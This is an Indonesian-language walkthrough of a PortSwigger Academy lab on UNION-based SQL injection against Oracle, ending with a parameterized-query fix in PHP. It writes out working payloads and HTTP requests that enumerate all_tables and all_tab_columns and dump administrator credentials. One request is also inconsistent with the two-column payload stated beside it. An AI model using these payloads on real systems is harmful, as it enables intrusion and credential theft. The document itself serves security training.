# [PortSwigger Academy] SQL Injection - Lab #6

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection attack, listing the database contents on Oracle
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menggunakan teknik UNION-Based SQLi untuk melakukan enumerasi skema database (mencari nama tabel dan kolom) khusus pada Oracle Database, lalu mengekstrak data kredensial administrator.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah keamanan berada pada parameter filter kategori. Karena sistem ini menggunakan database Oracle, kita harus mematuhi dua aturan mutlak sintaksis Oracle:
1. **Wajib Klausa `FROM`:** Setiap perintah `SELECT` harus memiliki klausa `FROM` (menggunakan tabel tiruan `FROM dual` saat melakukan testing awal).
2. **Kamus Data Oracle (Data Dictionary):** Untuk memetakan struktur database, kita harus mengakses tabel sistem **`all_tables`** (untuk mencari nama tabel) dan **`all_tab_columns`** (untuk mencari nama kolom).

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Menentukan Jumlah Kolom dan Tipe Data
Menggunakan teknik standar `ORDER BY` dan `UNION SELECT 'a', 'b' FROM dual--`, ditemukan bahwa kueri asli mengembalikan **2 kolom** dan **keduanya menerima tipe data string (teks)**.

### Mencari Nama Tabel (Enumerasi Tabel)
Untuk mencari tahu nama tabel yang menyimpan data kredensial pengguna, kita melakukan query ke tabel sistem `all_tables` dengan filter pencarian kata 'USER':

* **Payload:** `' UNION SELECT table_name, null FROM all_tables--`

```http
GET /filter?category=Gifts' UNION SELECT table_name FROM all_tables-- HTTP/2
Host: 0ac7006603a778b580e826c400fe0053.web-security-academy.net
```
Hasil: Pada respons halaman web, ditemukan nama tabel acak buatan sistem: USERS_HIGFND

### Mencari Nama Kolom (Enumerasi Kolom)
Setelah mengidentifikasi nama tabel USERS_HIGFND, langkah selanjutnya adalah mencari nama-nama kolom di dalam tabel tersebut menggunakan tabel sistem all_tab_columns:
* **Payload:** `' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_HIGFND'--`
```
GET /filter?category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_HIGFND'-- HTTP/2
Host: 0ac7006603a778b580e826c400fe0053.web-security-academy.net
```
Hasil: Ditemukan dua kolom penting yang menampung data sensitif: USERNAME_UXXQGP dan PASSWORD_OHZQKG

### Menguras Data Kredensial (Data Dumping)
Sekarang kita gabungkan informasi nama tabel dan kedua kolom tersebut untuk mengekstrak username dan password dari database:
* **Payload:** `' UNION SELECT USERNAME_UXXQGP, PASSWORD_OHZQKG FROM USERS_HIGFND--`
```
GET /filter?category=Gifts' UNION SELECT USERNAME_UXXQGP, PASSWORD_OHZQKG FROM USERS_HIGFND-- HTTP/2
Host: 0ac7006603a778b580e826c400fe0053.web-security-academy.net
```

### Hasil Eksekusi Database
Di sisi backend database Oracle, kueri dimanipulasi secara penuh menjadi:
```
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT USERNAME_UXXQGP, PASSWORD_OHZQKG FROM USERS_HIGFND--' AND released = 1
```
Hasil Akhir: Aplikasi menampilkan daftar seluruh user dan password teks murni di layar. Cari baris milik user administrator, salin password-nya, dan gunakan untuk login. Lab berhasil diselesaikan (Solved).

---

## 3. Rekomendasi Perbaikan
Untuk menutup celah keamanan eksfiltrasi data pada Oracle ini, tim developer wajib mengganti kueri dinamis dengan metode Parameterized Queries (Prepared Statements) menggunakan ekstensi pengemudi (driver) Oracle yang aman seperti OCI8 atau PDO Oracle.
Contoh Implementasi Perbaikan Kode (PHP dengan OCI8):
// KODE AMAN (SECURE)
```
$query = "SELECT * FROM products WHERE category = :category AND released = 1";
$statement = oci_parse($conn, $query);

// Menggunakan oci_bind_by_name untuk memastikan input diperlakukan sebagai string murni
oci_bind_by_name($statement, ":category", $_GET['category']);
oci_execute($statement);
```
Melalui metode binding parameter ini, karakter khusus seperti ' UNION tidak akan pernah diinterpretasikan oleh mesin database Oracle sebagai bagian dari instruksi kueri logika logika.